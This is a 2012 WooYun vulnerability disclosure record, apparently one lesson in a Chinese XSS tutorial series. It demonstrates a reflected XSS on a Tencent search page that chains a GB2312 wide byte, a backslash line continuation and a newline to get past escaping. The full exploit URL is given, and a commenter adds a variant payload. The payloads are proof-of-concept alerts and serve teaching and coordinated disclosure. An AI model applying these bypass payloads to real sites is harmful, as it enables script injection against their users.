{"id": 14898, "wybug_id": "wooyun-2012-016008", "wybug_title": "[腾讯实例教程] 那些年我们一起学XSS - 7. 宽字节、反斜线与换行符一起复仇记", "wybug_corp": "腾讯", "wybug_author": "心伤的瘦子", "wybug_date": "2012-12-14 13:06", "wybug_open_date": "2013-01-28 13:07", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-28：\t细节向公众公开  简要描述： 这一次，3个家伙一起上啦～ 详细说明：  1. 实例点如下：\nhttp://cgi.data.tech.qq.com/index.php?mod=search&type=data&site=digi&libid=2&curpage=1&pagenum=30&filterattr=138,138|16|4,5,4,5&filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&tplname=centersearch.shtml&orderby=aaaaaaaaaaaa\n老规矩，继续看我们的输出。\n\n2. 一共有3处输出，位于HTML属性里的那一处，我们放弃了，因为双引号被灭掉了。那么还剩下2处。 都是位于<script>..</script>里，而且挨在了一起。3. 先看第2处，是不是似曾相似啊？ 对的，教程6里刚刚遇到过。那就是输出在【注释】的情况。我们用换行符试试？\n\n4. 一条是好消息，换行可以用，一条是坏消息。。下面出现的一句坏了我们的好事。。肿么办。5. 这个时候，我们需要先说点javascript的知识。javascript，字符串允许下面多行的写法。\nvar  a=\"我是一个字符串\\我还是一个字符串\";alert(a);\n6. 基于这点，我们可以把缺陷点构造成下面的样子。\n//document.getElementById(\"order_select\").value = \"aaaa\\alert(1);//\";\tvar searchOrder = \"aaaa\\alert(1);//\";\n那么代码构造的解析如下：\n\n7.带着这个想法，请上我们的反斜线。。\n\n8. 悲剧的是，反斜线被过滤成了2个\\\\，这下不好办了。9. 还记得在教程4里，我们提到的宽字节用法么？说到了 %c0可以吃掉%5c。我们看看页面的编码。\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />\ngbxxx系列的啊，窃喜中。10. 于是，我们的%c0也加入战斗了。\nhttp://cgi.data.tech.qq.com/index.php?mod=search&type=data&site=digi&libid=2&curpage=1&pagenum=30&filterattr=138,138|16|4,5,4,5&filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&tplname=centersearch.shtml&orderby=aaaa%c0%5c%0aalert(1);//\n看看源码中的输出。 \\\\ 被我们变成了 乱码+\\\n\n11. 最后弹窗，见漏洞证明～～12. 此时，标点符号们正在开会，开会的主题是：“大家好，才是真的好”   漏洞证明：  \n\n   修复方案：  参加前面教程4，5，6   版权声明：转载请注明来源 心伤的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2012-12-17 15:07 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-14 13:11 |    \t\tzsx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | undefined)\t\t \n  刷新一下就看到7了= =    \n     2012-12-14 13:19 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @zsx 多谢关注    \n     2012-12-14 13:37 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  上课！    \n     2012-12-14 13:46 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  报道    \n     2012-12-14 14:17 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @心伤的瘦子 咱来个剧透呗？打算连载到几呢？    \n     2012-12-14 14:25 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @鬼魅羊羔 10 - 20之间吧， 能不能20+，看后面能不能找的到实例了。    \n     2012-12-14 15:09 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @心伤的瘦子 好多。。记得写详细点哈。。    \n     2012-12-14 15:25 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  昨天晚上到5，今天早上6，下午7....膜拜ing    \n     2012-12-14 16:08 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  友情提示：@心伤的胖子系列连载已全部开放，请自备洛阳铲开挖吧！    \n     2012-12-14 16:32 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  在360的安全大会上.冒着被嗅探的风险上来发一帖....加油...连载到368集    \n     2012-12-14 17:32 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  @only_guest 膜拜啊！这种精神值得啃顶    \n     2012-12-14 17:40 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @心伤的瘦子 不限腾讯嘛，教程重要～    \n     2012-12-14 18:31 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @一刀终情 普通站点的，往往没什么过滤，没过滤，教程就没法写。总不能教大家直接复制粘贴，回车+弹窗哈。 而腾讯往往有过滤，有攻有守才好看。     \n     2012-12-14 19:50 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @心伤的瘦子 你已经很乌云了。。    \n     2012-12-16 12:46 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @心伤的瘦子 还可以新浪微博系列嘛~~    \n     2012-12-17 18:58 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  @心伤的瘦子  膜拜    \n     2013-01-06 15:25 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  @心伤的瘦子 膜拜     \n     2013-01-19 16:28 |    \t\tDragonEgg \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:18        | 冷漠无情的绅士，温柔善良的坏蛋。)\t\t \n  @一刀终情 你个乌鸦嘴。。 WooYun: [新浪XSS一课一练]瘦子XSS教程第2课：输出在<script></script>之间    \n     2013-01-28 13:57 |    \t\tunxss \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        )\t\t \n  很精彩。    \n     2013-02-06 14:43 |    \t\tStream \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 低头要有勇气，抬头要有底气!)\t\t \n  屌爆了    \n     2013-02-16 18:43 |    \t\tmole3o \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 学生一枚，青春向上的白帽子。)\t\t \n  精彩！    \n     2013-06-19 21:11 |    \t\tKuuki \t\t\t( 普通白帽子  |\t\t\t        Rank:158 漏洞数:23        | :P)\t\t \n  精彩啊  膜拜一下    \n     2014-03-28 14:52 |    \t\twaldens \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小菜鸟一枚)\t\t \n  神！！    \n     2014-05-13 01:14 |    \t\tweiweiwind \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 菜鸟学习中～)\t\t \n  js不是非常熟练，还是常规点好price%c0%22;%0aalert(0);//    \n     2014-05-26 10:49 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  好玩    \n     2014-12-02 11:27 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  难得的是能找到无数的好例子。。更能难得的是，可以把一些细节运用的如此精妙。。妙到豪巅。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}